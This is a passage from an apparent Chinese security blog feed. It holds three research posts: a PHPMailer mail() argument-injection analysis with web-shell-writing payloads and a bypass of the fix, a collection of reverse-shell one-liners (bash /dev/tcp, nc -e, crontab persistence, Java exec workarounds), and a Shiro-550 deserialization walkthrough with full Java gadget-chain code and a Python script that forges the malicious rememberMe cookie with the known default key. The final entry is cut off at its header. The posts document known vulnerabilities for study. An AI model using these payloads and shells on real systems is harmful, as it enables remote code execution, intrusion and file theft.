<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require</span>(<span class="string">'phpmailer5.2.17/PHPMailerAutoload.php'</span>);</span><br><span class="line">	</span><br><span class="line">	$mail = <span class="keyword">new</span> PHPMailer;</span><br><span class="line">	$mail-&gt;setFrom($_GET[<span class="string">'x'</span>],<span class="string">'Server'</span>);</span><br><span class="line">	$mail-&gt;Subject = <span class="string">'&lt;?php phpinfo();?&gt;'</span>;</span><br><span class="line">	$mail-&gt;addAddress(<span class="string">'test@123.com'</span>,<span class="string">'attacker'</span>);</span><br><span class="line">	$mail-&gt;msgHTML(<span class="string">'test'</span>);</span><br><span class="line">	$mail-&gt;AltBody = <span class="string">'Body'</span>;</span><br><span class="line">	</span><br><span class="line">	$mail-&gt;send();</span><br></pre></td></tr></table></figure>

<p>从代码上来看，它先调用<code>setFrom()</code>。<br><img src="2.png" alt=""><br>setFrom()函数中，对传入的address先进行trim，然后进入<code>validateAddress()</code>函数，该函数将传入的address参数进行正则匹配验证邮箱的格式。然后将Subject属性赋值，添加收件人，设置msgHTML，AltBody。然后调用<code>send()</code>函数。<br><img src="3.png" alt=""><br>在send()函数中调用了<code>preSend()</code>和<code>postSend()</code>。来看看postSend()。<br><img src="4.png" alt=""><br>在这里面调用了<code>mailSend()</code>函数。<br><img src="5.png" alt=""><br>mailSend()函数中，然后调用了<code>mailPassthru()</code>函数。<br><img src="6.png" alt=""><br>在mailPassthru()函数中，最终调用了<code>mail()</code>函数。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>从后往前看，需要调用mail()函数的第5个参数，需要满足1)未开启safe_mode; 2)UseSendmailOptions为True。第二个条件默认满足，只需要满足第一个条件。  </p>
<p>在mailSend()函数中，第五个参数为-f加上Sender的值。那么payload的需放在Sender中。Sender是在setFrom()函数中做初始化的，值来自address。在该函数中，会将首位的空格、\r、\n空白字符去掉。然后判断是否含有@字符。之后调用validateAddress()函数对address进行验证。</p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>这里的绕过的payload是<code>aaa( -X/var/www/html/success.php )@qq.com</code>。</p>
<h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>任意文件读取漏洞用到了上面所述的<code>-C</code>和<code>-X</code>参数。当第5个参数为<code>a@qq.com -C/etc/passwd -X/tmp/456</code>，加载临时配置文件/etc/passwd发送邮件，将日志信息保存在/tmp/456中。</p>
<blockquote>
<p>在非ubuntu系统下，可能会存在权限问题，可加上 <code>-OQueueDirectory=/tmp</code>。则payload可转化为<code>aaa( -X/var/www/html/success.php -OQueueDirectory=/tmp )@qq.com</code>。或者使用<code>aaa( -X./success.php -oQ/tmp )@qq.com</code></p>
</blockquote>
<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>在5.2.18中的修复方式是在添加-f参数前，对Sender进行escapeshellarg()进行过滤。<br><img src="7.png" alt=""></p>
<h2 id="修复绕过"><a href="#修复绕过" class="headerlink" title="修复绕过"></a>修复绕过</h2><p>前面介绍过mail()函数对第5个参数本身就会进行escapeshellcmd()的过滤，这就导致了先进行escapeshellarg()后进行escapeshellcmd()，这俩对单引号的处理不同，导致单引号逃逸。关于这个的细节可以阅读<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a>。</p>
<p>绕过的payload为:<code>a&#39;( -OQueueDirectory=/tmp -X/tmp/123.php )@qq.com</code></p>
<h2 id="再次修复"><a href="#再次修复" class="headerlink" title="再次修复"></a>再次修复</h2><p>在5.2.20版本中，添加了isShellSafe()函数。<br><img src="8.png" alt=""><br><img src="9.png" alt=""><br>isShellSafe()函数中先用escapeshellcmd()和escapeshellarg()对字符串进行判断，然后过滤了除<code>@_-.</code>以及数字字母之外的字符。</p>
<h1 id="其他利用方式"><a href="#其他利用方式" class="headerlink" title="其他利用方式"></a>其他利用方式</h1><p>当系统使用Exim4发送邮件时，Exim4的<code>-be</code>参数支持运行扩展模式。在这些字符串扩展中，如下内容可被利用，更多的可查看<a href="https://linux.die.net/man/8/exim" target="_blank" rel="noopener">https://linux.die.net/man/8/exim</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;run&#123;&lt;command &lt;args&gt;&gt;&#125;&#123;&lt;string1&gt;&#125;&#123;&lt;string2&gt;&#125;&#125; &#x2F;&#x2F; 执行&lt;command&gt; &lt;args&gt;，成功返回string1，失败返回string2</span><br><span class="line">$&#123;substr&#123;pos&#125;&#123;num&#125;&#123;string&#125;&#125;</span><br><span class="line">$&#123;readfile&#123;&lt;file name&gt;&#125;&#123;eol string&#125;&#125; &#x2F;&#x2F;读取文件，以eol string分割</span><br><span class="line">$&#123;readsocket&#123;&lt;name&gt;&#125;&#123;request&#125;&#123;timeout&#125;&#123;eol string&#125;&#123;fail string&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>在Exim4中，可以使用${substr{pos}{num}{string}}从系统变量中截取想要的特殊字符。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="http://blog.nsfocus.net/hack-php-mail-additional_parameters/#Hack" target="_blank" rel="noopener"></a></li>
</ul>
]]></content>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>反弹shell的那些事儿</title>
    <url>/2020/07/08/reverse-shell/</url>
    <content><![CDATA[<p>最近在多种环境下进行反弹shell，在不同的环境下，它有着不同的限制，需要进行相应的变化。本文主要是记录这些问题，以便后续查看。</p>
<a id="more"></a>

<h1 id="反弹shell常用命令"><a href="#反弹shell常用命令" class="headerlink" title="反弹shell常用命令"></a>反弹shell常用命令</h1><ul>
<li>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</li>
<li>nc -e /bin/bash ip port</li>
</ul>
<h1 id="不同场景"><a href="#不同场景" class="headerlink" title="不同场景"></a>不同场景</h1><h2 id="Ubuntu-crontab反弹shell"><a href="#Ubuntu-crontab反弹shell" class="headerlink" title="Ubuntu crontab反弹shell"></a>Ubuntu crontab反弹shell</h2><h3 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h3><p>Linux下的cron中command执行的shell环境是<font color=#008000>/bin/sh</font>。/bin/sh是一个软连接，而它指向的环境是<font color=#008000>dash</font>。</p>
<p><img src="1.png" alt=""></p>
<p>虽然Centos下cron执行的shell环境也是<font color=#008000>/bin/sh</font>。但其指向了<font color=#008000>bash</font>。因此可以直接成功。</p>
<p><img src="2.png" alt=""></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ol>
<li>修改ubuntu中的/bin/sh的指向。<code>ln -s -f bash /bin/sh</code></li>
<li>避免直接在cron文件中使用bash这个shell，另建一个文件。<ul>
<li><code>#!/bin/bash
/bin/bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code> -&gt; /tmp/test.sh</li>
<li><code>chmod +x /tmp/test.sh</code></li>
<li><code>* * * * * /tmp/test.sh</code></li>
</ul>
</li>
<li>在sh的环境下执行bash -c<ul>
<li><code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1&quot;</code></li>
</ul>
</li>
</ol>
<h2 id="Java上下文反弹shell"><a href="#Java上下文反弹shell" class="headerlink" title="Java上下文反弹shell"></a>Java上下文反弹shell</h2><p>Java下命令执行的方式有: </p>
<ul>
<li>ProcessBuilder</li>
<li>Runtime</li>
<li>ProcessImpl</li>
</ul>
<p>其中Runtime.getRuntime().exex()的底层实际上也是ProcessBuilder。<br>Java在命令执行时，带有|,&lt;,&gt;等符号的命令没办法正常执行。</p>
<h3 id="原因-1"><a href="#原因-1" class="headerlink" title="原因"></a>原因</h3><p>当传入的command是字符串时，会经过StringTokenizer的分割即以空格进行分割，在这里分割的结果会使得命令变得非预期。分割结束后，Java的JDK沙盒机制会对分割后的第一个字符串进行checkExec，以确定是以什么命令环境启动，然后仅能执行单条命令，拼接不了相关参数。  </p>
<p>当传入的command是字符串数组时，不会经过分割，完整地保存了想要的语义。</p>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><ul>
<li>传入的字符串数组的命令。</li>
<li>linux下可以用bash的base64编码来解决特殊字符的问题。<a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">java.lang.Runtime.exec() Payload Workarounds</a></li>
<li>linux下使用${IFS}绕过分隔符。<code>/bin/bash -c bash${IFS}-i${IFS}&gt;&amp;/dev/tcp/ip/port&lt;&amp;1</code>。</li>
<li>利用$@。<code>/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</code>。</li>
</ul>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">解决ubuntu crontab反弹shell失败的问题</a>    </li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652471913&idx=1&sn=f8c29997df75dbe910be431e5beb2faa&scene=21#wechat_redirect" target="_blank" rel="noopener">Java下奇怪的命令执行</a></li>
<li><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>shiro-550反序列化漏洞分析复现</title>
    <url>/2020/05/08/shiro-550-attack/</url>
    <content><![CDATA[<p>Apache shiro是一个Java安全框架，执行身份验证、授权、密码和会话管理。2016年，曝光了其1.2.4版本以前存在反序列化漏洞。该漏洞被称为shiro-550。</p>
<a id="more"></a>

<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
<li>&lt;= 1.2.4</li>
</ul>
<h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>RememberMe</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>shiro默认的设置暴露了web应用的反序列化攻击。特别是考虑到最近使用的<font color=#008000>commons-collections</font>的利用。  </p>
<p>默认情况下，Apache Shiro框架使用<font color=#008000>CookieRememberMeManager</font>。它序列化、加密以及编码用户identity，以便之后的检索。因此，当它接收到来自未认证用户的请求时，它会寻找它们记住的identity，通过以下步骤:</p>
<ul>
<li>检索rememberMe cookie的值</li>
<li>Base64解码</li>
<li>使用AES解密</li>
<li>反序列化(ObjectInputStream)</li>
</ul>
<p>然而，默认加密的key是硬编码的，意味着任何可以获得源代码的人都知道默认加密密钥的值。因此，攻击者可以创建一个恶意的对象，序列化(在调用序列化时未进行任何的过滤)、编码，然后将其作为cookie发送。Shiro将解码并反序列化它，意味着现在恶意的对象已经存活在服务器上了。</p>
<h1 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h1><h2 id="cookie生成过程"><a href="#cookie生成过程" class="headerlink" title="cookie生成过程"></a>cookie生成过程</h2><p>对于利用方式的分析，首先跟进一下Cookie的生成存储过程。Shiro框架的特征是登录页面的cookie中存在rememberMe的内容值。在登录时勾选上remmemberMe框。</p>
<p>首先在<code>org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin</code>处下断点。</p>
<p><img src="1.png" alt=""></p>
<p>首先会进入<code>forgetIndentity</code>，在这个函数里将在response添加一些cookie信息。接着，由于设置了<code>token.setRememberMe(true)</code>。将会进入<code>rememberIdentity(subject,token,info)</code>。</p>
<p><img src="2.png" alt=""></p>
<p>首先获得info的principals，然后进入<code>rememberIndentity(subject,principals)</code>。跟进它</p>
<p><img src="3.png" alt=""></p>
<p>首先调用convertPrincipalsToBytes, 跟进它。它首先会序列化principals，然后，会用CBC模式进行分组加密。</p>
<p><img src="4.png" alt=""></p>
<p>然后调用<code>rememberSerializedIdentity</code>函数。跟进这个函数，可以看到它首先将序列化加密后的principals进行base64加密，然后存入cookie中。整个过程和我们了解到的一样，先<font color=#008000>序列化</font>，然后进行<font color=#008000>AES加密</font>，最后进行<font color=#008000>Base64加密</font>。</p>
<h2 id="cookie的反序列化过程"><a href="#cookie的反序列化过程" class="headerlink" title="cookie的反序列化过程"></a>cookie的反序列化过程</h2><p>首先来看看整个的调用链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DefaultSecurityManager.createSubject()</span><br><span class="line">  -&gt;DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">    -&gt;DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">      -&gt;AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">        -&gt;</span><br></pre></td></tr></table></figure>

<p>前面了解到了cookie生成的整个过程，接下来看看它的反序列化过程。选择了在<code>org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</code>这个位置下断点。其调用链如下所示</p>
<p><img src="5.png" alt=""></p>
<p>因为是从<code>SecurityManager</code>开始，然后开始进行相关的身份校验。往上走一步，定位到<code>getRememberedPrincipals</code>函数。</p>
<p><img src="6.png" alt=""></p>
<p>它首先会调用getRememberedSerializedIdentity函数，跟进它。</p>
<p><img src="7.png" alt=""></p>
<p>它会获取到http请求中的cookie值，然后将其进行base64解码并返回解码后的值。</p>
<p>然后跟进<code>convertBytesToPrincipals</code>函数。</p>
<p><img src="8.png" alt=""></p>
<p>它会先将其进行解密然后进行反序列化。首先decrypt函数会讲其进行解密。然后调用<code>deserialize</code>函数来处理解密后的内容。</p>
<p><img src="9.png" alt=""></p>
<p>跟进它。</p>
<p><img src="10.png" alt=""></p>
<p>继续跟进<code>this.getSerializer().deserialize</code>函数</p>
<p><img src="11.png" alt=""></p>
<p>这里进入到了DefaultSerializer.deserialize函数，这个函数里看到了熟悉的readObject函数。</p>
<p><img src="12.png" alt=""></p>
<p>到这里整个反序列化过程的分析就结束了。接下来看看如何利用吧！</p>
<h1 id="漏洞利用分析"><a href="#漏洞利用分析" class="headerlink" title="漏洞利用分析"></a>漏洞利用分析</h1><p>在大多数直接利用的版本中，发现shiro自带的commons-collections的版本是3.2.1，从前面针对commons-collections的<a href="https://ananaskr.github.io/2020/04/29/ysoserial-cc-sumary/" target="_blank" rel="noopener">总结</a>可以知道，CommonsCollections1，3，5，6，7，9，10都可以利用。  </p>
<p>然而在实际利用时，会发现无法直接利用shiro自带的commons-collections:3.2.1。从@orange和@zsx文章中，可以得知。<font color=#008000>Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，ClassLoader.loadClass不支持装载数组类型的class</font>。</p>
<p>让我们来分析分析这一过程。在前面分析到deserialize函数时，会发现</p>
<p><img src="13.png" alt=""></p>
<p>在第49行使用的是<code>ClassResolvingObjectInputStream</code>而不是传统的<code>ObjectInputStream</code>。跟进它，</p>
<p><img src="14.png" alt=""></p>
<p>可以看到它重写了ObjectInputStream的resolveClass函数。与下面这个传统的resolveClass相比，它使用的是<code>ClassUtils.forName()</code>。</p>
<p><img src="15.png" alt=""></p>
<p>跟进<code>ClassUtils.forName()</code>函数。</p>
<p><img src="16.png" alt=""></p>
<p>可以看到，它使用的是线程上下文加载器，它获取到的当前加载器是<code>ParallelWebappClassLoader</code>，其loadClass方法是继承自父类<code>WebappClassLoader</code>。会按照以下方式进行加载。</p>
<p><img src="17.png" alt=""></p>
<p>根据流程，<code>ParallelWebappClassLoader</code>会先寻找内部缓存，若找不到则交给URLClassLoader。在对于path为<code>/Lorg/apache/commons/collections/Transformer;.class</code>的情况下，是找不到的。所以，导致ClassNotFound。</p>
<p>因此，在利用链中不能包含数组，即在之前分析的命令执行点，不能使用ChainedTransformer这个类。因为这个类的成员变量是一个数组。而之前分析的CommonsCollections利用链中，有提到利用InvokerTransformer的transform方法来调用newTransformer。之前的介绍中有利用LazyMap.get()来触发transform。<a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">wh1t3p1g</a>也介绍了这种方式，结合了CommonsCollections5，6，9利用链，所以在这里就不再赘述了。直接来看看整个利用链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">  -&gt;HashMap.put()</span><br><span class="line">    -&gt;HashMap.hash()</span><br><span class="line">      -&gt;TiedMapEntry.hashCode()</span><br><span class="line">        -&gt;TiedMapEntry.getValue()</span><br><span class="line">          -&gt;LazyMap.get()</span><br><span class="line">            -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>

<p>完整的demo如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">StubTransletPayload</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = -<span class="number">5971610431559700674L</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Foo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">8207363842866235160L</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>;</span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">                command.replaceAll(<span class="string">"\\\\"</span>,<span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">                <span class="string">"\");"</span>;</span><br><span class="line"></span><br><span class="line">        Object templates = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>).newInstance();</span><br><span class="line"></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(StubTransletPayload<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass clazz = pool.get(StubTransletPayload<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line"></span><br><span class="line">        clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">        CtClass superC = pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        Field field = templates.getClass().getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(templates,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;classBytes,classFiles.classAsBytes(Foo<span class="class">.<span class="keyword">class</span>)&#125;)</span>;</span><br><span class="line"></span><br><span class="line">        Field field2 = templates.getClass().getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        field2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field2.set(templates,<span class="string">"ananaskr"</span>);</span><br><span class="line"></span><br><span class="line">        Field field3 = templates.getClass().getDeclaredField(<span class="string">"_tfactory"</span>);</span><br><span class="line">        field3.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field3.set(templates, TransformerFactoryImpl<span class="class">.<span class="keyword">class</span>.<span class="title">newInstance</span>())</span>;</span><br><span class="line"></span><br><span class="line">        InvokerTransformer transformer = <span class="keyword">new</span> InvokerTransformer(<span class="string">"toString"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazymap = LazyMap.decorate(innermap,transformer);</span><br><span class="line"></span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazymap,templates);</span><br><span class="line"></span><br><span class="line">        HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">        map.add(<span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        Field f = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("map");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">        Field f2 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("table");</span><br><span class="line">        &#125;<span class="keyword">catch</span> (NoSuchFieldException e)&#123;</span><br><span class="line">            f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">        &#125;</span><br><span class="line">        f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">        array = (Object[]) f2.get(innimpl);</span><br><span class="line">        Object node = array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Field keyField = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        keyField.set(node, entry);</span><br><span class="line">        </span><br><span class="line">        Field field0 = transformer.getClass().getDeclaredField(<span class="string">"iMethodName"</span>);</span><br><span class="line">        field0.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field0.set(transformer,<span class="string">"newTransformer"</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(baos);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = baos.toByteArray();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bais = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bais);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将其产生的序列化后的数据，放入脚本中，生成cookie即可。脚本内容如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode_rememberme</span><span class="params">(command)</span>:</span></span><br><span class="line">	popen = subprocess.Popen([<span class="string">'java'</span>,<span class="string">'-jar'</span>,<span class="string">'ysoserial.jar'</span>,<span class="string">'CommonsCollections5'</span>,command],stdout=subprocess.PIPE)</span><br><span class="line">	BS = AES.block_size</span><br><span class="line">	pad = <span class="keyword">lambda</span> s: s +((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">	key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">	mode = AES.MODE_CBC</span><br><span class="line">	iv = uuid.uuid4().bytes</span><br><span class="line">	encryptor = AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">	file_body = pad(popen.stdout.read())</span><br><span class="line">	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">	<span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	command = <span class="string">"open /Applications/Calculator.app"</span></span><br><span class="line">	payload = encode_rememberme(command)</span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">"/Users/xxx/Desktop/payload.cookie"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">		print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()),file=fpw)</span><br></pre></td></tr></table></figure>

<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>官方修复的方式是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该问题。然而，一些开源系统会使用固定的编码，通过搜索引擎、github来收集密钥，或许可以对该漏洞进行成功利用。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
<li><a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">Java反序列化利用链分析之Shiro反序列化</a></li>
<li><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">Shiro-反序列化记录</a></li>
<li><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a></li>
</ul>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>Shiro</tag>
      </tags>
  </entry>
  <entry>
    <title>RPO攻击技术研究</title>
    <url>/2020/07/18/rpo/</url>
